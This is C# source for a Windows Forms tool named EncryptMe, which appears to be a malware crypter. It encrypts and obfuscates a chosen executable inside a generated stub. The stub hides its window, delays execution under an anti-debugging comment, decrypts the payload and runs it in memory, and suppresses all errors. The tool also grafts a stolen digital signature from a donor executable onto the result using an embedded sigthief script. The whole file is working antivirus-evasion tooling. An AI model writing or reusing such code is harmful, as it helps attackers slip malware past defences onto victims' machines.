using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace EncryptMe
{
    public partial class Form1 : Form
    {
        private byte[] key;
        private byte[] iv;
        private string passphrase;

        public Form1()
        {
            InitializeComponent();
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Executable Files|*.exe";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                txtFilePath.Text = openFileDialog.FileName;
            }
        }

        private void btnBrowseSavePath_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "Executable Files|*.exe";
            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                txtSavePath.Text = saveFileDialog.FileName;
            }
        }

        private void btnBrowseDonorExe_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Executable Files|*.exe";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                txtDonorExePath.Text = openFileDialog.FileName;
            }
        }

        private void btnGenerateKeyIV_Click(object sender, EventArgs e)
        {
            using (Aes aes = Aes.Create())
            {
                aes.GenerateKey();
                aes.GenerateIV();
                key = aes.Key;
                iv = aes.IV;
                passphrase = GenerateRandomPassphrase();
                txtStatus.Text = "Key, IV, and passphrase generated successfully.";
            }
        }

        private void btnEncrypt_Click(object sender, EventArgs e)
        {
            string inputFilePath = txtFilePath.Text;
            string outputFilePath = txtSavePath.Text;
            string donorExePath = txtDonorExePath.Text;

            if (string.IsNullOrEmpty(inputFilePath))
            {
                txtStatus.Text = "Please select a file.";
                return;
            }

            if (string.IsNullOrEmpty(outputFilePath))
            {
                txtStatus.Text = "Please select an output file path.";
                return;
            }

            if (string.IsNullOrEmpty(donorExePath))
            {
                txtStatus.Text = "Please select a donor executable.";
                return;
            }

            if (key == null || iv == null)
            {
                txtStatus.Text = "Please generate a key and IV first.";
                return;
            }

            try
            {
                byte[] fileBytes = File.ReadAllBytes(inputFilePath);
                byte[] compressedBytes = Compress(fileBytes);
                byte[] encryptedBytes = Encrypt(compressedBytes, key, iv);
                byte[] salt = GenerateRandomSalt();
                byte[] saltedEncryptedBytes = salt.Concat(encryptedBytes).ToArray();
                byte[] xorEncryptedBytes = XOREncrypt(saltedEncryptedBytes, passphrase);
                string encodedData = Convert.ToBase64String(xorEncryptedBytes);

                string keyBase64 = Convert.ToBase64String(EncryptWithPassphrase(key, passphrase));
                string ivBase64 = Convert.ToBase64String(EncryptWithPassphrase(iv, passphrase));

                string stubSourceCode = GenerateStubSource(encodedData, keyBase64, ivBase64, passphrase, salt);
                File.WriteAllText("Stub.cs", stubSourceCode);

                // Ensure the correct path to csc.exe
                string cscPath = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe";
                if (!File.Exists(cscPath))
                {
                    txtStatus.Text = $"Error: csc.exe not found at {cscPath}";
                    return;
                }

                // Compile the stub source code into an executable
                ProcessStartInfo processStartInfo = new ProcessStartInfo
                {
                    FileName = cscPath,
                    Arguments = $"/out:{outputFilePath} /target:winexe Stub.cs",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                Process process = new Process
                {
                    StartInfo = processStartInfo
                };

                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                if (process.ExitCode == 0 && File.Exists(outputFilePath))
                {
                    // Add digital signature to the output file using the Python script
                    RunPythonScript(donorExePath, outputFilePath);

                    txtStatus.Text = "File encrypted, stub created, and signed successfully.";
                }
                else
                {
                    txtStatus.Text = $"Error during compilation: {error}\nOutput: {output}";
                }
            }
            catch (Exception ex)
            {
                txtStatus.Text = $"Error: {ex.Message}";
            }
        }

        static byte[] Encrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Padding = PaddingMode.PKCS7;

                using (var ms = new MemoryStream())
                {
                    using (var cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(data, 0, data.Length);
                        cs.Close();
                    }
                    return ms.ToArray();
                }
            }
        }

        static byte[] EncryptWithPassphrase(byte[] data, string passphrase)
        {
            using (Aes aes = Aes.Create())
            {
                using (Rfc2898DeriveBytes keyGen = new Rfc2898DeriveBytes(passphrase, new byte[8], 10000))
                {
                    aes.Key = keyGen.GetBytes(32);
                    aes.IV = keyGen.GetBytes(16);
                    aes.Padding = PaddingMode.PKCS7;
                    using (var ms = new MemoryStream())
                    {
                        using (var cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(data, 0, data.Length);
                            cs.Close();
                        }
                        return ms.ToArray();
                    }
                }
            }
        }

        static byte[] XOREncrypt(byte[] data, string key)
        {
            byte[] keyBytes = Encoding.UTF8.GetBytes(key);
            byte[] result = new byte[data.Length];

            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ keyBytes[i % keyBytes.Length]);
            }

            return result;
        }

        static byte[] Compress(byte[] data)
        {
            using (var compressedStream = new MemoryStream())
            {
                using (var zipStream = new System.IO.Compression.GZipStream(compressedStream, System.IO.Compression.CompressionMode.Compress))
                {
                    zipStream.Write(data, 0, data.Length);
                }
                return compressedStream.ToArray();
            }
        }

        static string GenerateRandomPassphrase()
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var random = new Random();
            return new string(Enumerable.Repeat(chars, 16)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            const string charsWithDigits = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var random = new Random();
            char firstChar = chars[random.Next(chars.Length)]; // Ensure the first character is a letter
            string remainingChars = new string(Enumerable.Repeat(charsWithDigits, length - 1)
                .Select(s => s[random.Next(s.Length)]).ToArray());
            return firstChar + remainingChars;
        }

        static byte[] GenerateRandomSalt(int length = 16)
        {
            var random = new RNGCryptoServiceProvider();
            byte[] salt = new byte[length];
            random.GetBytes(salt);
            return salt;
        }

        private string GenerateStubSource(string encodedData, string keyBase64, string ivBase64, string passphrase, byte[] salt)
        {
            // Convert salt to Base64 string
            string saltBase64 = Convert.ToBase64String(salt);

            // Randomize variable and method names
            string className = RandomString(10);
            string variable1 = GenerateUniqueRandomString(10, new string[] { });
            string variable2 = GenerateUniqueRandomString(10, new string[] { variable1 });
            string variable3 = GenerateUniqueRandomString(10, new string[] { variable1, variable2 });
            string method1 = GenerateUniqueRandomString(10, new string[] { className });
            string method2 = GenerateUniqueRandomString(10, new string[] { className, method1 });
            string method3 = GenerateUniqueRandomString(10, new string[] { className, method1, method2 });

            return $@"
using System;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Linq;

namespace Stub
{{
    abstract class BaseDecryptor
    {{
        public abstract byte[] Decrypt(byte[] data, byte[] key, byte[] iv);
    }}

    class {className} : BaseDecryptor
    {{
        [DllImport(""kernel32.dll"")]
        static extern IntPtr GetConsoleWindow();

        [DllImport(""user32.dll"")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

        static void Main(string[] args)
        {{
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            try
            {{
                Thread.Sleep(10000); // Anti-debugging: delay execution

                string encodedData = ""{encodedData}"";
                string passphrase = ""{passphrase}"";
                string saltBase64 = ""{saltBase64}"";
                byte[] salt = Convert.FromBase64String(saltBase64);
                byte[] encryptedBytes = Convert.FromBase64String(encodedData);
                byte[] xorEncryptedBytes = {method1}(encryptedBytes, passphrase);
                byte[] saltedEncryptedBytes = xorEncryptedBytes.Skip(salt.Length).ToArray(); // Remove the salt before decryption

                byte[] key = {method2}(Convert.FromBase64String(""{keyBase64}""), passphrase);
                byte[] iv = {method2}(Convert.FromBase64String(""{ivBase64}""), passphrase);

                byte[] decryptedBytes = new {className}().Decrypt(saltedEncryptedBytes, key, iv);
                byte[] decompressedBytes = Decompress(decryptedBytes);

                // Load the decrypted assembly from memory
                Assembly assembly = Assembly.Load(decompressedBytes);
                MethodInfo method = assembly.EntryPoint;
                if (method != null)
                {{
                    var parameters = method.GetParameters().Length == 0 ? null : new object[] {{ new string[] {{ }} }};
                    method.Invoke(null, parameters);
                }}
            }}
            catch (Exception ex)
            {{
                // Handle exceptions silently
            }}
        }}

        public override byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
        {{
            using (Aes aes = Aes.Create())
            {{
                aes.Key = key;
                aes.IV = iv;
                aes.Padding = PaddingMode.PKCS7;

                using (var ms = new MemoryStream())
                {{
                    using (var cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {{
                        cs.Write(data, 0, data.Length);
                        cs.Close();
                    }}
                    return ms.ToArray();
                }}
            }}
        }}

        static byte[] {method2}(byte[] data, string passphrase)
        {{
            using (Aes aes = Aes.Create())
            {{
                using (Rfc2898DeriveBytes keyGen = new Rfc2898DeriveBytes(passphrase, new byte[8], 10000))
                {{
                    aes.Key = keyGen.GetBytes(32);
                    aes.IV = keyGen.GetBytes(16);
                    aes.Padding = PaddingMode.PKCS7;
                    using (var ms = new MemoryStream())
                    {{
                        using (var cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                        {{
                            cs.Write(data, 0, data.Length);
                            cs.Close();
                        }}
                        return ms.ToArray();
                    }}
                }}
            }}
        }}

        static byte[] {method1}(byte[] data, string key)
        {{
            byte[] keyBytes = Encoding.UTF8.GetBytes(key);
            byte[] result = new byte[data.Length];

            for (int i = 0; i < data.Length; i++)
            {{
                result[i] = (byte)(data[i] ^ keyBytes[i % keyBytes.Length]);
            }}

            return result;
        }}

        static byte[] Decompress(byte[] data)
        {{
            using (var compressedStream = new MemoryStream(data))
            {{
                using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
                {{
                    using (var resultStream = new MemoryStream())
                    {{
                        zipStream.CopyTo(resultStream);
                        return resultStream.ToArray();
                    }}
                }}
            }}
        }}
    }}
}}
";
        }

        static string GenerateUniqueRandomString(int length, string[] existingStrings)
        {
            string result;
            do
            {
                result = RandomString(length);
            } while (existingStrings.Contains(result));
            return result;
        }

        private void RunPythonScript(string donorExePath, string targetExePath)
        {
            string pythonScript = ExtractPythonScript();

            string tempScriptPath = Path.Combine(Path.GetTempPath(), "sigthief.py");
            File.WriteAllText(tempScriptPath, pythonScript);

            ProcessStartInfo start = new ProcessStartInfo
            {
                FileName = "python",
                Arguments = $"\"{tempScriptPath}\" -i \"{donorExePath}\" -t \"{targetExePath}\" -a",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(start))
            {
                using (StreamReader reader = process.StandardOutput)
                {
                    string result = reader.ReadToEnd();
                    txtStatus.AppendText(result);
                }
                using (StreamReader reader = process.StandardError)
                {
                    string result = reader.ReadToEnd();
                    txtStatus.AppendText(result);
                }
            }

            // Rename the signed file to the original target file name
            string signedFilePath = targetExePath + "_signed";
            if (File.Exists(signedFilePath))
            {
                File.Delete(targetExePath);
                File.Move(signedFilePath, targetExePath);
            }
        }

        private string ExtractPythonScript()
        {
            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("EncryptMe.Scripts.sigthief.py"))
            using (StreamReader reader = new StreamReader(stream))
            {
                return reader.ReadToEnd();
            }
        }
    }
}

